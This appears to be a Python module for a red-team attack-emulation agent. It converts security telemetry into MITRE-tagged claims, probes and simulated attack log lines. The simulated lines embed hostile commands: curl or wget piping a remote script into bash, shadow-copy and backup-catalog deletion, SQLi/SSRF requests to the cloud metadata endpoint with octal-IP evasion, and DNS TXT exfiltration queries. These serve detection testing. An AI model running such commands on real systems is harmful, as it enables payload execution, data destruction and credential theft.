"""Penetrating Red Operator & Attack Emulation Agent with structured observed-vs-hypothesized claims."""

from __future__ import annotations

from typing import Any, Dict, List, Optional, Tuple

from hermes_cyber.models import (
    AnalyticalClaim,
    ArtifactIngestionResult,
    EvidenceRecord,
    MitreStep,
    RedOperationPlan,
    RedProbe,
    SimulatedAttackEvent,
)
from hermes_cyber.observer import PrivacyScrubber, is_record_correlated_with_any, is_routine_dns_txt_record
from hermes_cyber.router_bridge import ModelRouter, invoke_router_json


def _has_any(text: str, needles: tuple[str, ...]) -> bool:
    low = text.lower()
    return any(n in low for n in needles)


def _infer_claim_priority(
    missing_conditions: List[str],
    tactic: str = "",
    technique_id: str = "",
) -> Tuple[str, str]:
    """Classify investigative priority of a claim based on completeness and tactical severity."""
    if not missing_conditions:
        is_critical = (
            tactic in ("Exfiltration", "Impact", "Privilege Escalation", "Initial Access")
            or technique_id in ("T1190", "T1552.005", "T1611", "T1048.003", "T1490", "T1059.004")
        )
        return (
            "critical" if is_critical else "high",
            "Tutte le condizioni di raggiungibilità o esecuzione risultano presenti nei record citati; richiesta verifica o contenimento immediato.",
        )
    if len(missing_conditions) == 1:
        return (
            "high",
            "Una singola prova discriminante separa l'ipotesi di compromissione/esposizione da un'attività ordinaria.",
        )
    if len(missing_conditions) == 2:
        return (
            "medium",
            "Indicatore parziale con più precondizioni non verificate; raccogliere telemetria di processo o volume prima di escalare.",
        )
    return (
        "low",
        "Indicatore singolo isolato privo di volume, processo originante e correlazione; bassa priorità finché non emergono anomalie.",
    )


def _format_evidence_bundle(ingestion: ArtifactIngestionResult) -> str:
    return "\n".join(f"[{ev.evidence_id}] ({ev.source_type}) {ev.raw_content}" for ev in ingestion.evidences)


def _is_unmitigated_sink_record(ev: EvidenceRecord) -> bool:
    sinks = ev.entities.get("sinks", [])
    controls = ev.entities.get("controls", [])
    if not sinks:
        return False
    for sink in sinks:
        if sink == "ssrf_fetch" and "url_allowlist" in controls:
            continue
        return True
    return False


def _collect_subject_entities(ev_by_id: Dict[str, EvidenceRecord], evidence_ids: List[str]) -> Dict[str, List[str]]:
    keys = ("hosts", "ips", "users", "processes", "endpoints")
    agg: Dict[str, List[str]] = {k: [] for k in keys}
    for eid in evidence_ids:
        ev = ev_by_id.get(eid)
        if not ev:
            continue
        for k in keys:
            for item in ev.entities.get(k, []):
                if item and item not in agg[k]:
                    agg[k].append(item)
    return agg


def _format_observed_fact(ev_by_id: Dict[str, EvidenceRecord], evidence_ids: List[str], summary_prefix: str = "") -> str:
    snippets: List[str] = []
    for eid in evidence_ids[:2]:
        ev = ev_by_id.get(eid)
        if ev:
            snippets.append(f"[{eid}] {ev.raw_content.strip()[:140]}")
    joined = " | ".join(snippets) if snippets else "No matching record snippet."
    return f"{summary_prefix} {joined}".strip() if summary_prefix else joined


def _group_records_by_host(records: List[EvidenceRecord]) -> List[Tuple[Optional[str], List[EvidenceRecord]]]:
    distinct_hosts: List[str] = []
    for r in records:
        for h in r.entities.get("hosts", []):
            if h not in distinct_hosts:
                distinct_hosts.append(h)
    if len(distinct_hosts) <= 1:
        return [(distinct_hosts[0] if distinct_hosts else None, records)]

    grouped: Dict[str, List[EvidenceRecord]] = {h: [] for h in distinct_hosts}
    unscoped: List[EvidenceRecord] = []
    for r in records:
        hs = r.entities.get("hosts", [])
        if hs:
            grouped[hs[0]].append(r)
        else:
            unscoped.append(r)
    out: List[Tuple[Optional[str], List[EvidenceRecord]]] = [(h, recs) for h, recs in grouped.items() if recs]
    if unscoped and out:
        out[0][1].extend(unscoped)
    elif unscoped:
        out.append((None, unscoped))
    return out


def _synthesize_deterministic_red_plan(ingestion: ArtifactIngestionResult) -> RedOperationPlan:
    """Analyze ingested artifacts per phenomenon/entity into structured observed-vs-hypothesized claims."""
    threat_evs = [ev for ev in ingestion.evidences if not ev.is_benign_baseline]
    ev_by_id = {ev.evidence_id: ev for ev in ingestion.evidences}
    all_raw = "\n".join(ev.raw_content for ev in threat_evs)

    cited: List[str] = []
    kill_chain: List[MitreStep] = []
    claims: List[AnalyticalClaim] = []
    probes: List[RedProbe] = []
    sim_events: List[SimulatedAttackEvent] = []
    blind_spots: List[str] = []
    hypotheses: List[str] = []
    confidences: List[float] = []
    covered_eids: set[str] = set()

    def _cite(eids: List[str]) -> None:
        for eid in eids:
            if eid not in cited:
                cited.append(eid)

    def _add_step_and_claim(
        *,
        tactic: str,
        technique_id: str,
        technique_name: str,
        observed_fact: str,
        proposed_interpretation: str,
        evidence_ids: List[str],
        reachability_proof: str,
        missing_conditions: Optional[List[str]] = None,
        confirming_or_refuting_proof: str = "",
        priority: Optional[str] = None,
        priority_rationale: Optional[str] = None,
    ) -> None:
        missing = [m for m in (missing_conditions or []) if m]
        status = "open" if missing else "supported"
        inferred_prio, inferred_rationale = _infer_claim_priority(missing, tactic, technique_id)
        final_prio = priority if priority in ("critical", "high", "medium", "low") else inferred_prio
        final_rationale = priority_rationale or inferred_rationale
        step_idx = len(kill_chain)
        claim_id = f"CLM-{step_idx + 1:02d}"
        subj = _collect_subject_entities(ev_by_id, evidence_ids)
        _cite(evidence_ids)
        covered_eids.update(evidence_ids)
        kill_chain.append(MitreStep(
            tactic=tactic,
            technique_id=technique_id,
            technique_name=technique_name,
            description=proposed_interpretation,
            evidence_ids=list(evidence_ids),
            reachability_proof=reachability_proof,
            claim_id=claim_id,
            observed_fact=observed_fact,
            proposed_interpretation=proposed_interpretation,
            missing_conditions=missing,
            confirming_or_refuting_proof=confirming_or_refuting_proof,
            status=status,  # type: ignore[arg-type]
        ))
        claims.append(AnalyticalClaim(
            claim_id=claim_id,
            step_index=step_idx,
            tactic=tactic,
            technique_id=technique_id,
            observed_fact=observed_fact,
            evidence_ids=list(evidence_ids),
            subject_entities=subj,
            proposed_interpretation=proposed_interpretation,
            missing_conditions=missing,
            confirming_or_refuting_proof=confirming_or_refuting_proof,
            status=status,  # type: ignore[arg-type]
            priority=final_prio,  # type: ignore[arg-type]
            priority_rationale=final_rationale,
        ))

    def _add_sim(
        *,
        variant: str,
        log_line: str,
        mitre_technique_id: str,
        claim_id: str = "",
    ) -> None:
        sim_events.append(SimulatedAttackEvent(
            event_id=f"SIM-RED-{len(sim_events) + 1:02d}",
            variant=variant,  # type: ignore[arg-type]
            log_line=log_line,
            mitre_technique_id=mitre_technique_id,
            claim_id=claim_id or (claims[-1].claim_id if claims else ""),
        ))

    def _next_probe_id() -> str:
        return f"RED-PRB-{len(probes) + 1:02d}"

    # Track 1: Multi-Hop Code / IaC SQLi -> Unmitigated SSRF -> IMDS -> Container Escape
    sql_evs = [
        e.evidence_id
        for e in threat_evs
        if "sql_concat" in e.entities.get("sinks", []) or "union select" in e.raw_content.lower()
    ]
    ssrf_evs = [
        e.evidence_id
        for e in threat_evs
        if (
            ("ssrf_fetch" in e.entities.get("sinks", []) and "url_allowlist" not in e.entities.get("controls", []))
            or "169.254.169.254" in e.raw_content
        )
    ]
    priv_evs = [
        e.evidence_id
        for e in threat_evs
        if "container_priv" in e.entities.get("sinks", []) or "privileged: true" in e.raw_content.lower()
    ]

    if (sql_evs and ssrf_evs) or "169.254.169.254" in all_raw:
        ep = next((ep for ev in threat_evs for ep in ev.entities.get("endpoints", [])), "/api/v1/export")
        has_live_probe = "169.254.169.254" in all_raw or "union+select" in all_raw.lower()
        has_route = any(ep_item.startswith("/") for ev in threat_evs for ep_item in ev.entities.get("endpoints", []))
        if sql_evs:
            sql_missing: List[str] = []
            if not (has_route or has_live_probe):
                sql_missing.append("No external HTTP entrypoint or unvalidated caller parameter is shown reaching the SQL concatenation.")
            _add_step_and_claim(
                tactic="Initial Access",
                technique_id="T1190",
                technique_name="Exploit Public-Facing Application (SQLi -> SSRF Pivot)",
                observed_fact=_format_observed_fact(ev_by_id, sql_evs, f"Dynamic SQL string construction observed at `{ep}`:"),
                proposed_interpretation="String concatenation in SQL filter lets attacker inject controlled webhook URL or extract DB records.",
                evidence_ids=sql_evs,
                reachability_proof=f"Route `{ep}` concatenates parameter directly into SQL string.",
                missing_conditions=sql_missing,
                confirming_or_refuting_proof=f"Send safe boolean canary on `{ep}` or verify parameterized bindings replace string interpolation.",
            )
        if ssrf_evs:
            ssrf_missing: List[str] = []
            if not (has_route or has_live_probe or sql_evs):
                ssrf_missing.append("Lack of URL allowlist and reachability from untrusted caller input are not yet verified.")
            _add_step_and_claim(
                tactic="Credential Access",
                technique_id="T1552.005",
                technique_name="Cloud Instance Metadata API (SSRF)",
                observed_fact=_format_observed_fact(ev_by_id, ssrf_evs, "Unvalidated outbound HTTP fetch / IMDS reference observed:"),
                proposed_interpretation="Unvalidated URL fetch allows pivoting directly to cloud IMDS endpoint (169.254.169.254) for IAM tokens.",
                evidence_ids=ssrf_evs,
                reachability_proof="Function parameter flows directly into `requests.get(...)` without CIDR/host allowlist.",
                missing_conditions=ssrf_missing,
                confirming_or_refuting_proof="Confirm non-RFC1918/IMDS URL allowlist enforcement and redirect blocking on outbound HTTP call.",
            )
        if priv_evs:
            _add_step_and_claim(
                tactic="Privilege Escalation",
                technique_id="T1611",
                technique_name="Escape to Host via Privileged Container",
                observed_fact=_format_observed_fact(ev_by_id, priv_evs, "Container deployment sets privileged security context:"),
                proposed_interpretation="Privileged pod security context amplifies SSRF/RCE compromise to node-level host breakout.",
                evidence_ids=priv_evs,
                reachability_proof="Deployment manifest explicitly sets `privileged: true` and `allowPrivilegeEscalation: true`.",
                missing_conditions=[],
                confirming_or_refuting_proof="Inspect live Kubernetes PodSecurity spec for `privileged: false` and dropped capabilities.",
            )
        probes.append(RedProbe(
            probe_id=_next_probe_id(),
            title="Non-destructive SQLi + Loopback SSRF Reachability Check",
            target_surface=ep,
            method_or_vector="HTTP GET safe-canary probe",
            payload_or_command=f"GET {ep}?tenant_id=1'+AND+'1'='1&webhook_url=http://169.254.169.254/latest/meta-data/",
            expected_ioc="200 OK with metadata key names or SQL parser syntax delta in response",
        ))
        _add_sim(
            variant="baseline_attack",
            log_line=f'src=198.51.100.88 method=GET {ep}?tenant_id=%27+UNION+SELECT+1&webhook_url=http://169.254.169.254/latest/meta-data/ status=200',
            mitre_technique_id="T1190",
        )
        _add_sim(
            variant="evasion_variant",
            log_line=f'src=198.51.100.89 method=GET {ep}?tenant_id=1%2f**%2fuNiOn%2f**%2fsElEcT&webhook_url=http://0251.0376.0251.0376/latest/meta-data/ status=200',
            mitre_technique_id="T1552.005",
        )
        blind_spots.append("Simple regex blocks on `169.254.169.254` fail against octal/decimal IP aliases (0251.0376.0251.0376) and `UNION` SQL comment evasion.")
        hypotheses.append("Exploitable Multi-Hop Chain: SQL Injection feeding Cloud Metadata SSRF in a Privileged Pod.")
        confidences.append(0.92)

    # Track 2: DNS TXT Tunneling / Token Leak + Encoded Execution
    # Bypass routine DNS TXT filtering only when correlated by entity & time window with active execution/token stages.
    dns_exec_evs = [
        e.evidence_id
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("powershell", "pwsh", "child_of="))
    ]
    token_evs = [
        e.evidence_id
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("token_leak",))
    ]
    active_stage_recs = [ev_by_id[eid] for eid in [*dns_exec_evs, *token_evs] if eid in ev_by_id]
    dns_evs = [
        e.evidence_id
        for e in threat_evs
        if e.evidence_id not in covered_eids
        and _has_any(e.raw_content, ("qtype=txt", "c2-sync", "txt query"))
        and (
            not is_routine_dns_txt_record(e)
            or is_record_correlated_with_any(e, active_stage_recs, threat_evs)
        )
    ]
    if dns_evs or token_evs:
        dns_subj = _collect_subject_entities(ev_by_id, [*token_evs, *dns_exec_evs, *dns_evs])
        dns_only_subj = _collect_subject_entities(ev_by_id, dns_evs) if dns_evs else dns_subj
        tok_subj = _collect_subject_entities(ev_by_id, token_evs) if token_evs else dns_subj
        exec_subj = _collect_subject_entities(ev_by_id, dns_exec_evs) if dns_exec_evs else dns_subj
        host_lbl = (dns_only_subj["hosts"] or dns_subj["hosts"] or ["db-core-02"])[0]
        tok_host_lbl = (tok_subj["hosts"] or [host_lbl])[0]
        exec_host_lbl = (exec_subj["hosts"] or [host_lbl])[0]
        src_ip = (dns_only_subj["ips"] or dns_subj["ips"] or ["10.10.4.22"])[0]
        proc_lbl = (exec_subj["processes"] or dns_subj["processes"] or ["powershell.exe"])[0]

        dns_recs = [ev_by_id[eid] for eid in dns_evs if eid in ev_by_id]
        corr_exec_evs = [
            eid for eid in dns_exec_evs
            if is_record_correlated_with_any(ev_by_id[eid], dns_recs, threat_evs)
        ] if dns_recs else []
        corr_token_evs = [
            eid for eid in token_evs
            if is_record_correlated_with_any(ev_by_id[eid], dns_recs, threat_evs)
        ] if dns_recs else []
        policy_recs = [
            e for e in threat_evs
            if _has_any(e.raw_content, ("dns_txt_authorized=false", "maintenance_window=false"))
        ]
        has_dns_policy_breach = any(
            is_record_correlated_with_any(p, dns_recs, threat_evs)
            for p in policy_recs
        ) if dns_recs else False

        has_dns_process = any(
            ev_by_id[eid].entities.get("processes") or "child_of=" in ev_by_id[eid].raw_content.lower()
            for eid in dns_evs
        ) or bool(corr_exec_evs)
        has_dns_vol_entropy = (
            any(_has_any(ev_by_id[eid].raw_content, ("entropy=", "bytes=", "rate=", "c2-sync")) for eid in dns_evs)
            or len(dns_evs) >= 2
        )

        dns_missing: List[str] = []
        if not has_dns_vol_entropy:
            dns_missing.append("Query volume, frequency, and TXT payload entropy/content are unknown.")
        if not has_dns_process:
            dns_missing.append("Originating process lineage is not identified.")
        if not (corr_token_evs or corr_exec_evs or has_dns_policy_breach):
            dns_missing.append("No correlation with credential access, execution, or policy violation in the same time window.")

        if token_evs:
            _add_step_and_claim(
                tactic="Credential Access",
                technique_id="T1528",
                technique_name="Steal Application Access Token",
                observed_fact=_format_observed_fact(ev_by_id, token_evs, f"Credential/token leak telemetry recorded on `{tok_host_lbl}`:"),
                proposed_interpretation=f"Leaked bearer credential on `{tok_host_lbl}` grants authenticated pivot capability on database/ETL tier.",
                evidence_ids=token_evs,
                reachability_proof="Raw token exposure event observed on internal service host prior to execution.",
                missing_conditions=[],
                confirming_or_refuting_proof="Rotate exposed credential and audit subsequent token usage across auth logs.",
            )
        if dns_exec_evs:
            _add_step_and_claim(
                tactic="Execution",
                technique_id="T1059.001",
                technique_name="Command and Scripting Interpreter (Encoded PowerShell)",
                observed_fact=_format_observed_fact(ev_by_id, dns_exec_evs, f"Encoded command execution observed on `{exec_host_lbl}`:"),
                proposed_interpretation=f"Worker process spawned `{proc_lbl}` obfuscating staging collector on `{exec_host_lbl}`.",
                evidence_ids=dns_exec_evs,
                reachability_proof=f"Process lineage execution event observed on `{exec_host_lbl}`.",
                missing_conditions=[],
                confirming_or_refuting_proof=f"Decode encoded script argument and verify parent-child process tree on `{exec_host_lbl}`.",
            )
        if dns_evs:
            _add_step_and_claim(
                tactic="Exfiltration",
                technique_id="T1048.003",
                technique_name="Exfiltration Over Alternative Protocol (DNS TXT)",
                observed_fact=_format_observed_fact(ev_by_id, dns_evs, "Observed DNS TXT query activity:"),
                proposed_interpretation="DNS TXT queries may represent covert C2 or data exfiltration channel bypassing HTTP proxy inspection.",
                evidence_ids=dns_evs,
                reachability_proof=(
                    "Correlated high-entropy/unauthorized TXT queries with execution & token leak."
                    if not dns_missing
                    else "Single/partial TXT query observed without correlated volume, lineage, or authorization evidence."
                ),
                missing_conditions=dns_missing,
                confirming_or_refuting_proof="Correlate DNS TXT queries with the originating process, volume/entropy metrics, and suspicious timeframe activity.",
            )
        else:
            # token_leak observed alone without DNS exfil or execution corroboration
            if claims and not dns_exec_evs:
                claims[-1].missing_conditions.append("Post-exposure lateral movement or data egress from leaked credential is not yet observed.")
                claims[-1].status = "open"
                p_val, p_rat = _infer_claim_priority(claims[-1].missing_conditions, claims[-1].tactic, claims[-1].technique_id)
                claims[-1].priority = p_val  # type: ignore[assignment]
                claims[-1].priority_rationale = p_rat
                kill_chain[-1].missing_conditions = list(claims[-1].missing_conditions)
                kill_chain[-1].status = "open"

        probes.append(RedProbe(
            probe_id=_next_probe_id(),
            title="Egress DNS TXT Tunneling & Process Lineage Verification",
            target_surface=f"{host_lbl} egress resolver + child processes",
            method_or_vector="Canary TXT DNS lookup audit + parent-child process query",
            payload_or_command="dig +short TXT canaryprobe01.exfil.c2-sync.example.net @resolver",
            expected_ioc="DNS firewall alert triggered on unauthorized TXT entropy > 4.2 or worker->shell fork",
        ))
        _add_sim(
            variant="baseline_attack",
            log_line=f'dns_src={src_ip} qtype=TXT query="JBSWY3DPEBLW64TMMQ.exfil.c2-sync.example.net" proc={proc_lbl} cmd="{proc_lbl} -enc SQBFAFgA" entropy=4.9',
            mitre_technique_id="T1048.003",
        )
        _add_sim(
            variant="evasion_variant",
            log_line=f'dns_src={src_ip} qtype=CNAME query="a1b2c3d4e5.sync.c2-sync.example.net" proc=pwsh cmd="pwsh -EncodedCommand QQBiAEM=" entropy=4.7',
            mitre_technique_id="T1048.003",
        )
        blind_spots.append("SOC threshold alerts focus on HTTP floods while low-rate DNS TXT/CNAME egress runs unnoticed.")
        if dns_missing:
            hypotheses.append(f"Open Hypothesis on `{host_lbl}`: DNS TXT query could be exfiltration, pending volume, process lineage, and window correlation.")
            confidences.append(0.45)
        else:
            hypotheses.append(f"Active Multi-Stage Intrusion on `{host_lbl}`: Token theft, encoded execution, and DNS C2 exfiltration.")
            confidences.append(0.90)

    # Track 2b: WAF Bypass / Unsafe Deserialization / Shell Reverse Staging (scoped by host/records)
    waf_recs = [
        e
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("pickle.loads", "waf_status=allowed", "sh -c"))
    ]
    if waf_recs:
        for host_key, h_recs in _group_records_by_host(waf_recs):
            # Include only corroborating records that share host/ip/endpoint with this host group
            grp_subj = _collect_subject_entities(ev_by_id, [r.evidence_id for r in h_recs])
            grp_hosts = set(grp_subj["hosts"])
            grp_ips = set(grp_subj["ips"])
            grp_eps = set(grp_subj["endpoints"])

            scoped_recs = list(h_recs)
            for e in threat_evs:
                if e in scoped_recs or e.evidence_id in covered_eids:
                    continue
                if _has_any(e.raw_content, ("waf_status=allowed", "pickle.loads", "sh -c", "payload_b64=", "egress_dst=")) and (
                    (grp_hosts and set(e.entities.get("hosts", [])) & grp_hosts)
                    or (grp_ips and set(e.entities.get("ips", [])) & grp_ips)
                    or (grp_eps and set(e.entities.get("endpoints", [])) & grp_eps)
                ):
                    scoped_recs.append(e)

            deser_ids = [e.evidence_id for e in scoped_recs if _has_any(e.raw_content, ("waf_status=allowed", "pickle.loads", "payload_b64="))]
            shell_ids = [e.evidence_id for e in scoped_recs if _has_any(e.raw_content, ("sh -c", "curl ", "egress_dst="))]
            all_grp_ids = list(dict.fromkeys([e.evidence_id for e in scoped_recs]))
            final_subj = _collect_subject_entities(ev_by_id, all_grp_ids)
            host_lbl = host_key or (final_subj["hosts"] or ["web-api-03"])[0]
            ep = (final_subj["endpoints"] or ["/api/v2/session/restore"])[0]
            proc_lbl = (final_subj["processes"] or ["python3"])[0]

            if deser_ids:
                _add_step_and_claim(
                    tactic="Defense Evasion",
                    technique_id="T1190",
                    technique_name="WAF Header Smuggling / Unsafe Deserialization",
                    observed_fact=_format_observed_fact(ev_by_id, deser_ids, f"Unsafe deserialization / WAF bypass observed on `{host_lbl}`:"),
                    proposed_interpretation=f"Serialized payload on `{ep}` bypasses query-only WAF rules and triggers unsafe object deserialization.",
                    evidence_ids=deser_ids,
                    reachability_proof=f"Header/body deserialization reaches `pickle.loads` on `{ep}`.",
                    missing_conditions=[] if (shell_ids or "pickle.loads" in all_raw.lower()) else ["Serialized payload decoding into execution sink is not confirmed."],
                    confirming_or_refuting_proof=f"Send malformed non-exec JSON/base64 canary to `{ep}` and confirm rejection before deserialization.",
                )
            if shell_ids:
                _add_step_and_claim(
                    tactic="Execution",
                    technique_id="T1059.004",
                    technique_name="Unix Shell Reverse Staging (`sh -c`)",
                    observed_fact=_format_observed_fact(ev_by_id, shell_ids, f"Unexpected shell command execution observed on `{host_lbl}`:"),
                    proposed_interpretation=f"Application worker `{proc_lbl}` spawned OS shell command with external egress on `{host_lbl}`.",
                    evidence_ids=shell_ids,
                    reachability_proof=f"Process telemetry confirms worker `{proc_lbl}` forked shell execution on `{host_lbl}`.",
                    missing_conditions=[],
                    confirming_or_refuting_proof=f"Audit `{proc_lbl} -> sh` fork events and outbound egress ACL on `{host_lbl}`.",
                )
            probes.append(RedProbe(
                probe_id=_next_probe_id(),
                title="Header Deserialization Boundary Verification",
                target_surface=f"{host_lbl} {ep}",
                method_or_vector="POST malformed non-exec JSON/base64 probe",
                payload_or_command=f"POST {ep} X-Token-Fmt: base64 body=e30=",
                expected_ioc="Endpoint rejects with 400 JSON-only error rather than invoking unsafe deserialization",
            ))
            _add_sim(
                variant="baseline_attack",
                log_line=f'host={host_lbl} method=POST {ep} proc=sh cmd="sh -c curl http://91.132.147.18/s.sh | bash" pickle.loads',
                mitre_technique_id="T1059.004",
            )
            _add_sim(
                variant="evasion_variant",
                log_line=f'host={host_lbl} method=POST {ep} proc=dash cmd="/bin/sh -c wget -qO- http://91.132.147.18/s.sh" parent_proc={proc_lbl}',
                mitre_technique_id="T1059.004",
            )
            blind_spots.append("Edge WAF inspects only URL query parameters, ignoring serialized Base64 blobs and worker->shell forks.")
            hypotheses.append(f"WAF Bypass & Remote Code Execution on `{host_lbl}`.")
            confidences.append(0.91)

    # Track 3: Ransomware-like / Shadow Copy / Mass Encrypted Writes — scoped PER HOST!
    r_records = [
        e
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("vssadmin", "writes_enc_ext", "encrypted"))
    ]
    if r_records:
        for host_key, h_recs in _group_records_by_host(r_records):
            # Pull auxiliary records for the exact same host (e.g., ChangeControl / signer / VLAN records)
            host_evs = list(h_recs)
            if host_key:
                for e in threat_evs:
                    if e not in host_evs and host_key in e.entities.get("hosts", []):
                        host_evs.append(e)
            r_ids = [e.evidence_id for e in host_evs]
            grp_subj = _collect_subject_entities(ev_by_id, [r.evidence_id for r in h_recs])
            host_lbl = host_key or (grp_subj["hosts"] or ["srv-fin-01"])[0]
            proc_lbl = (grp_subj["processes"] or ["vssadmin.exe"])[0]
            user_lbl = (grp_subj["users"] or ["service_account"])[0]
            has_shadow_del = any("delete shadows" in r.raw_content.lower() or "vss_deleted=true" in r.raw_content.lower() for r in h_recs)

            _add_step_and_claim(
                tactic="Impact",
                technique_id="T1490",
                technique_name="Inhibit System Recovery / Suspect Bulk Encryption",
                observed_fact=_format_observed_fact(ev_by_id, [r.evidence_id for r in h_recs], f"Shadow query / encrypted-extension write telemetry on `{host_lbl}` by `{user_lbl}` ({proc_lbl}):"),
                proposed_interpretation=f"Suspected Ransomware Encryption & Shadow Copy Manipulation on `{host_lbl}` via `{proc_lbl}`.",
                evidence_ids=r_ids,
                reachability_proof=f"Telemetry on `{host_lbl}` records shadow enumeration and/or `.enc` file writes.",
                missing_conditions=[],
                confirming_or_refuting_proof=f"Verify binary release signature, authorized VLAN destination, and ChangeControl approval for `{proc_lbl}` on `{host_lbl}`.",
            )
            probes.append(RedProbe(
                probe_id=_next_probe_id(),
                title=f"Shadow Copy & Binary Provenance Audit ({host_lbl})",
                target_surface=f"{host_lbl} process {proc_lbl}",
                method_or_vector="Read-only binary signature & change ticket cross-check",
                payload_or_command="Get-AuthenticodeSignature / vssadmin list shadows provenance",
                expected_ioc="Unverified unsigned binary or missing CHG ticket confirms ransomware; trusted signer refutes it",
            ))
            _add_sim(
                variant="baseline_attack",
                log_line=f'host={host_lbl} proc=vssadmin.exe cmd="vssadmin delete shadows /all /quiet" ransomware_note=true writes_enc_ext=2500',
                mitre_technique_id="T1486",
            )
            _add_sim(
                variant="evasion_variant",
                log_line=f'host={host_lbl} proc=wbadmin.exe cmd="wbadmin delete catalog -quiet" vss_deleted=true writes_enc_ext=980 signature_verified=false',
                mitre_technique_id="T1490",
            )
            blind_spots.append("Process-only alerts cannot distinguish ransomware from signed Change-Control backups without signer/VLAN checks.")
            hypotheses.append(f"Suspected Ransomware / Shadow Copy Manipulation on `{host_lbl}`.")
            confidences.append(0.84 if has_shadow_del else 0.68)

    # Track 3b: Brute Force / Failed Auth — scoped cleanly per host/account!
    bf_records = [
        e
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("auth=failed", "bruteforce"))
    ]
    if bf_records:
        for host_key, h_recs in _group_records_by_host(bf_records):
            grp_subj = _collect_subject_entities(ev_by_id, [r.evidence_id for r in h_recs])
            grp_ips = set(grp_subj["ips"])
            grp_users = set(grp_subj["users"])
            host_evs = list(h_recs)
            for e in threat_evs:
                if e in host_evs or e.evidence_id in covered_eids:
                    continue
                if (
                    (host_key and host_key in e.entities.get("hosts", []))
                    or (grp_ips and set(e.entities.get("ips", [])) & grp_ips)
                    or (grp_users and set(e.entities.get("users", [])) & grp_users)
                ):
                    host_evs.append(e)

            bf_ids = [e.evidence_id for e in host_evs]
            ep = (grp_subj["endpoints"] or ["/api/v1/metrics"])[0]
            user_lbl = (grp_subj["users"] or ["svc_metrics"])[0]
            has_volume_proof = len(h_recs) >= 2 or _has_any(
                " ".join(r.raw_content for r in h_recs),
                ("total_attempts=", "bruteforce", "password_spray_targets="),
            )
            bf_missing = [] if has_volume_proof else [
                "Single failed login lacks burst volume, source diversity, or multi-account spray evidence."
            ]
            _add_step_and_claim(
                tactic="Credential Access",
                technique_id="T1110",
                technique_name="Brute Force / High-Frequency Failed Logins",
                observed_fact=_format_observed_fact(ev_by_id, [r.evidence_id for r in h_recs], f"Failed authentication events on `{ep}` for `{user_lbl}`:"),
                proposed_interpretation=f"Suspected Credential Brute Force targeting `{user_lbl}` on `{ep}`.",
                evidence_ids=bf_ids,
                reachability_proof=f"Failed authentication events recorded against `{ep}` for `{user_lbl}`.",
                missing_conditions=bf_missing,
                confirming_or_refuting_proof="Cross-check source IP/agent origin, unique targeted usernames, and recent credential rotation records.",
            )
            probes.append(RedProbe(
                probe_id=_next_probe_id(),
                title="Service Principal Lockout & Rate-Limit Resilience Check",
                target_surface=ep,
                method_or_vector="Auth policy & rate-limit configuration inspection",
                payload_or_command=f"Inspect failed_auth threshold & password rotation sync for {user_lbl}",
                expected_ioc="External IP spray or multi-user failures confirm attack; stale internal poller after rotation refutes brute force",
            ))
            _add_sim(
                variant="baseline_attack",
                log_line=f'src=185.220.101.4 endpoint={ep} auth=FAILED user=admin password_spray_targets=25 external_ingress=true',
                mitre_technique_id="T1110",
            )
            _add_sim(
                variant="evasion_variant",
                log_line=f'src=185.220.101.9 endpoint={ep} auth=FAILED user={user_lbl} agent="Mozilla/5.0" external_ingress=true',
                mitre_technique_id="T1110.003",
            )
            blind_spots.append("Threshold SIEM rules trigger blindly without correlating internal password rotation events.")
            hypotheses.append(f"Suspected Credential Brute Force targeting `{user_lbl}` on `{ep}`.")
            confidences.append(0.64 if has_volume_proof else 0.40)

    # Track 4: WMI/SMB Lateral Movement Telemetry
    lat_evs = [
        e.evidence_id
        for e in threat_evs
        if e.evidence_id not in covered_eids and _has_any(e.raw_content, ("smb", "wmi", "wmic", "4624", "pass-the-hash"))
    ]
    if lat_evs:
        lat_subj = _collect_subject_entities(ev_by_id, lat_evs)
        host_lbl = (lat_subj["hosts"] or ["db-prod-01"])[0]
        user_lbl = (lat_subj["users"] or ["adm_rossi"])[0]
        src_ip = (lat_subj["ips"] or ["10.10.8.44"])[0]
        has_gap = _has_any(all_raw, ("logsourceunavailable", "truncated", "missing_fields", "status=ambiguous"))
        has_auth_detail = "logontype=" in all_raw.lower() and "ticketencryption=" in all_raw.lower()
        lat_missing: List[str] = []
        if has_gap or not has_auth_detail:
            lat_missing.append(
                "VPN authentication logs are unavailable/truncated and Kerberos LogonType/TicketEncryption provenance cannot distinguish Pass-the-Hash from authorized administration."
            )

        _add_step_and_claim(
            tactic="Lateral Movement",
            technique_id="T1047",
            technique_name="Windows Management Instrumentation / Admin Pivot",
            observed_fact=_format_observed_fact(ev_by_id, lat_evs, f"Remote WMI/SMB activity observed involving `{user_lbl}` (`{src_ip}`) -> `{host_lbl}`:"),
            proposed_interpretation=f"Suspected Privileged Lateral Movement via WMI/SMB telemetry (`{user_lbl}` -> `{host_lbl}`).",
            evidence_ids=lat_evs,
            reachability_proof=f"Host session / remote WMI command telemetry observed for `{user_lbl}` targeting `{host_lbl}`.",
            missing_conditions=lat_missing,
            confirming_or_refuting_proof=f"Query un-truncated VPN session logs and Event 4624 LogonType/TicketEncryption for `{user_lbl}` ({src_ip}).",
        )
        probes.append(RedProbe(
            probe_id=_next_probe_id(),
            title="Admin Session Provenance & LogonType Discrimination",
            target_surface="auth / kerberos / vpn-gw",
            method_or_vector="Cross-log authentication verification",
            payload_or_command="Query Security Event 4624 LogonType + TicketEncryption + VPN session table",
            expected_ioc="RC4 NTLM LogonType=3 without VPN session confirms Pass-the-Hash compromise",
        ))
        _add_sim(
            variant="baseline_attack",
            log_line=f'host={host_lbl} proto=SMB proc=wmic cmd="wmic /node:{host_lbl} process call create" TicketEncryption=RC4 LogonType=3',
            mitre_technique_id="T1047",
        )
        _add_sim(
            variant="evasion_variant",
            log_line=f'host={host_lbl} proto=DCOM proc=powershell.exe cmd="Invoke-CimMethod -ClassName Win32_Process" LogonType=3',
            mitre_technique_id="T1021",
        )
        blind_spots.append("Missing VPN/Kerberos logon correlation leaves legitimate emergency admin vs stolen token indistinguishable.")
        hypotheses.append(f"Suspected Privileged Lateral Movement via WMI/SMB telemetry (`{user_lbl}` -> `{host_lbl}`).")
        confidences.append(0.62)

    # Track 4b: Fallback unmitigated code/config sinks or isolated threat indicators (skips comments, routine TXT, & telemetry gaps)
